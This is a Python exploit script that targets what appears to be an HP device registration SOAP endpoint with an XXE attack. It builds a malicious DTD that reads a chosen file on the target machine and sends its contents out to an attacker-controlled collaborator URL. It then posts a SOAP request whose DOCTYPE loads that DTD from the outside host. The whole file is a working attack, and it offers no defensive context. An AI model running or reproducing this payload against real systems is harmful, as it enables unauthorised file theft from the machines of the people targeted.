import requests
import uuid
import sys
import urllib3


urllib3.disable_warnings(category=urllib3.exceptions.InsecureRequestWarning)

def create_malicious_dtd(filename, collaborator_url):
    """
    Creates a malicious DTD with file exfiltration via XXE.
    
    Args:
    filename (str): Path to the file on the target machine to be exfiltrated.
    collaborator_url (str): The URL to which the file content will be exfiltrated.
    
    Returns:
    str: The DTD content.
    """
    dtd_content = f"""
    <!ENTITY % file SYSTEM "file:///{filename}">
    <!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM '{collaborator_url}/?content=%file;'>">
    %eval;
    %exfiltrate;
    """
    with open("malicious.dtd", "w") as f:
        f.write(dtd_content)
        f.close()
    print(f"[*] Created malicious.dtd to read {filename}")
    return dtd_content


def send_soap_request(host, filename, collaborator_url):
    dtd = create_malicious_dtd(filename, collaborator_url)
    # Endpoint URL
    url = f"https://{host}:7906/DeviceRegistration/DeviceRegistration.svc"

    # SOAP 1.2 headers with WS-Addressing
    headers = {
        "Content-Type": "application/soap+xml;charset=UTF-8",
    }


    # SOAP envelope using WS-Addressing with correct input/output actions
    soap_envelope = f"""
    <soap12:Envelope xmlns:soap12="http://www.w3.org/2003/05/soap-envelope"
                     xmlns:wsa="http://www.w3.org/2005/08/addressing"
                     xmlns:tns="http://www.hp.com/it/sa/reg/">
        <soap12:Header>
            <wsa:Action>http://www.hp.com/it/sa/reg/Registration/RegisterDevice</wsa:Action>
            <wsa:MessageID>urn:uuid:{uuid.uuid4()}</wsa:MessageID>
            <wsa:To>https://localhost:7906/DeviceRegistration/DeviceRegistration.svc</wsa:To>
            <tns:AuthenticationHeader>
                <tns:Gdid>exampleGdid</tns:Gdid>
                <tns:RegistrationToken>exampleToken</tns:RegistrationToken>
            </tns:AuthenticationHeader>
        </soap12:Header>
        <soap12:Body>
            <tns:RegisterDevice>
                <tns:identifiers>
                            <![CDATA[
                        <!DOCTYPE a SYSTEM "{collaborator_url}/malicious.dtd">
                        <a>&callhome;</a>
                    ]]>
                </tns:identifiers>
                <tns:userId>user123</tns:userId>
                <tns:password>password123</tns:password>
                <tns:locale>en-US</tns:locale>
                <tns:optIn>true</tns:optIn>
            </tns:RegisterDevice>
        </soap12:Body>
    </soap12:Envelope>
    """

    try:
        # Send the SOAP request
        response = requests.post(url, data=soap_envelope, headers=headers, verify=False)  # Disable SSL verification for self-signed certs
        # Print the response
        if response.status_code != 200:
            print("Error Occured.")
        else:
            # print(f"Response: {response.text}")
            print(f"[+] Successfully sent the request")
    except:
        pass
        exit(-1)


if __name__ == "__main__":
    # Example usage:
    if len(sys.argv) != 4:
        print(f"Usage: python3 {sys.argv[0]} <host> <filename> <collaborator_url>")
        sys.exit(1)

    host = sys.argv[1]
    filename = sys.argv[2]
    collaborator_url = sys.argv[3]

    send_soap_request(host, filename, collaborator_url)